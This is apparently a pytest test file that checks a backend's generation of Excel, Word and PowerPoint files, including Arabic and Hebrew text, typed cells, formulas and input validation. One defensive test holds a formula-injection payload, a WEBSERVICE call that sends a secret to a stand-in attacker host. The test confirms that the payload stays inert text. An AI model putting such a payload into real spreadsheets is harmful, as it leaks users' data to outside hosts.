"""Real local Office packages; no API/model mocks and no Office UI claim."""
from io import BytesIO
from xml.etree import ElementTree as ET
from zipfile import ZipFile

import pytest
from pydantic import ValidationError

from backend.skill_artifacts import NS, build_artifact, calculate_totals


def workbook():
    return {
        'title':'ميزانية — תקציב — Budget', 'sheet_name':'بيانات',
        'columns':[{'name':'المعرّف','type':'text'}, {'name':'Amount','type':'number'}, {'name':'תאריך','type':'date'}],
        'rows':[['001',0,'2026-11-15'], ['002',None,None], ['003',2.75,'2026-11-16'], ['004',-1.25,'2026-11-17']],
        'totals':[1], 'sources':[{'label':'Synthetic fixture','location':'rows 1–4'}],
    }


def part(result, path):
    with ZipFile(BytesIO(result.content)) as package:
        return ET.fromstring(package.read(path))


def test_spreadsheet_zero_missing_date_identifier_and_formula_are_real_types():
    output = build_artifact('xlsx',workbook())
    sheet = part(output,'xl/worksheets/sheet1.xml')
    cells = {c.attrib['r']:c for c in sheet.findall('.//s:c',NS)}
    assert cells['A2'].attrib['t']=='inlineStr'
    assert cells['A2'].findtext('s:is/s:t',namespaces=NS)=='001'
    assert cells['B2'].findtext('s:v',namespaces=NS)=='0'
    assert cells['B3'].find('s:v',NS) is None  # missing is not zero
    assert int(cells['C2'].findtext('s:v',namespaces=NS))>45000
    assert cells['C2'].attrib['s']=='3'
    assert cells['B6'].findtext('s:f',namespaces=NS)=='SUM(B2:B5)'
    assert cells['B6'].findtext('s:v',namespaces=NS)=='1.50'
    assert sheet.find('s:autoFilter',NS).attrib['ref']=='A1:C5'
    assert sheet.find('s:sheetViews/s:sheetView/s:pane',NS).attrib['state']=='frozen'
    assert sheet.find('s:sheetViews/s:sheetView',NS).attrib['rightToLeft']=='1'
    assert output.verification['formulas']==1


def test_changing_input_changes_cached_total_with_native_formula_preserved():
    data = workbook()
    assert calculate_totals(data)=={1:'1.50'}
    data['rows'][0][1]=10
    output = build_artifact('xlsx',data)
    cell = part(output,'xl/worksheets/sheet1.xml').find(".//s:c[@r='B6']",NS)
    assert cell.findtext('s:f',namespaces=NS)=='SUM(B2:B5)'
    assert cell.findtext('s:v',namespaces=NS)=='11.50'
    assert part(output,'xl/workbook.xml').find('s:calcPr',NS).attrib['calcMode']=='auto'
    # This is our bounded Decimal evaluator, not a claim Office was launched.
    assert 'not observed' in output.verification['calculation']


@pytest.mark.parametrize('value',[True,'2.5',float('nan'),float('inf'),10**16,10**1000])
def test_spreadsheet_invalid_numeric_values_are_rejected(value):
    data = workbook(); data['rows'][0][1]=value
    with pytest.raises((ValueError,ValidationError)): build_artifact('xlsx',data)


@pytest.mark.parametrize('value',['2026-02-30','26-11-15','1899-12-31',45001])
def test_spreadsheet_invalid_dates_are_rejected(value):
    data=workbook(); data['rows'][0][2]=value
    with pytest.raises((ValueError,ValidationError)): build_artifact('xlsx',data)


def test_untrusted_formula_like_text_remains_literal_and_no_external_relation():
    data=workbook(); data['rows'][0][0]='=WEBSERVICE("https://attacker.invalid/?secret")'
    output=build_artifact('xlsx',data)
    cell=part(output,'xl/worksheets/sheet1.xml').find(".//s:c[@r='A2']",NS)
    assert cell.attrib['t']=='inlineStr' and cell.find('s:f',NS) is None
    assert cell.findtext('s:is/s:t',namespaces=NS)==data['rows'][0][0]
    with ZipFile(BytesIO(output.content)) as package:
        assert all('externalLink' not in name and 'vba' not in name.lower() for name in package.namelist())
        for name in package.namelist():
            if name.endswith('.rels'):
                assert all(r.attrib.get('TargetMode')!='External' for r in ET.fromstring(package.read(name)))


@pytest.mark.parametrize('change',[{'totals':[0]},{'totals':[1,1]},{'sheet_name':'../bad'},{'rows':[['001']]},{'unknown':True}])
def test_workbook_scope_shape_and_totals_validation(change):
    with pytest.raises((ValueError,ValidationError)): build_artifact('xlsx',workbook()|change)


def test_docx_reopens_with_real_headings_tables_direction_and_original_text():
    from docx import Document
    from docx.oxml.ns import qn
    text='اللّغة العربيّة — שלום 25 ₪ — Riwaq AI | 2.1'
    output=build_artifact('docx',{
        'title':'تقرير', 'paragraphs':[{'text':'النتائج','style':'heading1'},{'text':text},{'text':'عنصر','style':'bullet'}],
        'tables':[{'headers':['اسم','قيمة'], 'rows':[['المبلغ','0'],['مفقود','']]}],
        'sources':[{'label':'[S1] دليل اصطناعي','location':'PDF page 2, revision 1'}],
    })
    doc=Document(BytesIO(output.content))
    assert any(p.style.name=='Heading 1' and p.text=='النتائج' for p in doc.paragraphs)
    assert any(p.text==text for p in doc.paragraphs)
    assert doc.tables[0].cell(1,1).text=='0'
    assert doc.tables[0].cell(2,1).text==''
    assert doc.tables[0].rows[0]._tr.find('.//'+qn('w:tblHeader')) is not None
    assert doc.paragraphs[0]._p.find('.//'+qn('w:bidi')).get(qn('w:val'))=='1'
    assert any('PDF page 2, revision 1' in p.text for p in doc.paragraphs)
    assert output.verification['reopened']=='python-docx'
    assert output.media_type.endswith('wordprocessingml.document')


def test_presentation_has_editable_text_table_and_resolvable_parts():
    output=build_artifact('pptx',{'title':'عرض', 'slides':[
        {'title':'نتائج — Results', 'body':['القيمة 42 ₪','שלום — do not translate API'], 'source_labels':['[S1] PDF page 2']},
        {'title':'جدول', 'table':{'headers':['العنصر','القيمة'],'rows':[['A','0'],['B','42']]},'source_labels':['[S1] cells A1:B3']},
    ]})
    first=part(output,'ppt/slides/slide1.xml')
    assert 'القيمة 42 ₪' in [t.text for t in first.findall('.//a:t',NS)]
    assert first.find('.//p:sp/p:txBody',NS) is not None
    assert first.find('.//p:pic',NS) is None
    assert all(p.attrib['rtl']=='1' for p in first.findall('.//a:pPr',NS))
    assert part(output,'ppt/slides/slide2.xml').find('.//a:tbl',NS) is not None
    assert output.verification['slides']==2 and output.verification['native_tables']==1
    import posixpath
    with ZipFile(BytesIO(output.content)) as package:
        names=set(package.namelist())
        for name in names:
            if name.endswith('.rels'):
                base=posixpath.dirname(posixpath.dirname(name))
                for relationship in ET.fromstring(package.read(name)):
                    target=posixpath.normpath(posixpath.join(base,relationship.attrib['Target']))
                    assert target in names, (name,target)


@pytest.mark.parametrize('payload',[
    {'title':'x','slides':[{'title':'x','body':['x'*161]}]},
    {'title':'x','slides':[{'title':'x','body':['x\ny']}]},
    {'title':'x','slides':[{'title':'x','body':['x'],'table':{'headers':['A'],'rows':[['1']]}}]},
])
def test_unsupported_slide_layout_fails_instead_of_silent_truncation(payload):
    with pytest.raises((ValueError,ValidationError)): build_artifact('pptx',payload)


@pytest.mark.parametrize('kind,payload',[
    ('docx',{'title':'bad\x00text'}),
    ('xlsx',workbook()|{'rows':[['bad\x00',0,'2026-11-15']]}),
    ('pptx',{'title':'x','slides':[{'title':'x','body':['bad\x00']}]}),
])
def test_xml_controls_rejected(kind,payload):
    with pytest.raises((ValueError,ValidationError)): build_artifact(kind,payload)


def test_input_budget_and_unknown_formats():
    with pytest.raises(ValueError,match='150000'):
        build_artifact('docx',{'title':'x','paragraphs':[{'text':'x'*4000} for _ in range(40)]})
    with pytest.raises(ValueError,match='Unsupported'):
        build_artifact('exe',{'title':'x'})
